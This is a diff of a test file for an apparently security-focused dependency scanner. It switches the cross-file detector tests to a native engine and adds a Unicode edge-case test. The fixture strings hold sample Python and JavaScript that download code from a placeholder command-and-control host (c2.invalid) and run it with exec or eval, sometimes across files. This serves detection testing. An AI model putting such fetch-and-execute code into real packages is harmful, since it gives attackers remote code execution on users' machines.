@@ -1,11 +1,11 @@
-// 0.1.8 in the npm engine: the cross-file received-code follower
-// (lib/crossfile.js, twin of core._cross_file_received_issues), which the
-// --deps checks run. python/tests/scanner/test_cross_file_follower.py has
-// the full cases (the forms, the adversarial pass, the crafted false
-// positives, the event emitter of 0.1.8) and
-// tests/architecture/test_js_parity_crossfile.py compares the
-// engines on them and on a generated stream. Inert text: hosts are .invalid,
-// nothing is executed.
+// 0.1.8 in the npm package: the cross-file received-code follower, which the
+// --deps checks run: the native engine's (rust/…/crossfile.rs, a port of
+// core._cross_file_received_issues), through lib/native.js.
+// python/tests/scanner/test_cross_file_follower.py has the full cases (the
+// forms, the adversarial pass, the crafted false positives, the event
+// emitter of 0.1.8) and tests/architecture/test_rust_parity_crossfile.py
+// holds the native engine to core on them and on a generated stream. Inert
+// text: hosts are .invalid, nothing is executed.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -13,7 +13,7 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "nod
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
-import { crossFileReceivedIssues } from "../src/lib/crossfile.js";
+import { crossFileIssues } from "../src/lib/native.js";
 
 const U = "'https://c2.invalid/p'";
 const PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n";
@@ -22,7 +22,7 @@ const RECEIVED = "Dependency code runs code it receives over the network; the va
 const RUN_THERE = "Dependency code runs code it receives over the network; the function that runs it is in another file of the package";
 const py = (files) => Object.entries(files).map(([p, content]) => ({ path: "site-packages/" + p, lang: "py", dep: true, content }));
 const js = (files) => Object.entries(files).map(([p, content]) => ({ path: "node_modules/pkg/" + p, lang: "js", dep: true, content }));
-const found = (files) => crossFileReceivedIssues(files).map((i) => [i.file, i.sev, i.msg.slice(0, i.msg.lastIndexOf(" ("))]);
+const found = (files) => crossFileIssues(files).map((i) => [i.file, i.sev, i.msg.slice(0, i.msg.lastIndexOf(" ("))]);
 
 test("a value received in one file and run in another", () => {
   assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\nexec(pull())\n" })),
@@ -45,6 +45,14 @@ test("the adversarial forms: an object's methods, a Promise, a runner in another
   assert.deepEqual(found(py({ "pkg/util.py": "def run(code):\n    exec(code)\n",
     "pkg/__init__.py": "import requests\nfrom .util import run\nrun(requests.get(" + U + ").text)\n" })),
   [["site-packages/pkg/__init__.py", "CRITICAL", RUN_THERE]]);
+});
+
+test("characters outside the BMP and lone surrogates, at a file's end and the next one's start", () => {
+  // (each file is sent to the engine on its own: a lone surrogate at the end of one and the start
+  // of the next stay two characters, as in Python, not a pair)
+  const files = js({ "net.js": "// \u{1F600}\n" + JS_NET + "//\uD800", "run.js": "\uDC00\nconst { pull } = require('./net');\npull().then((c) => eval(c));\n" });
+  assert.deepEqual(found(files), [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]]);
+  assert.equal(crossFileIssues(files)[0].line, 3);
 });
 
 test("crafted false positives stay quiet", () => {
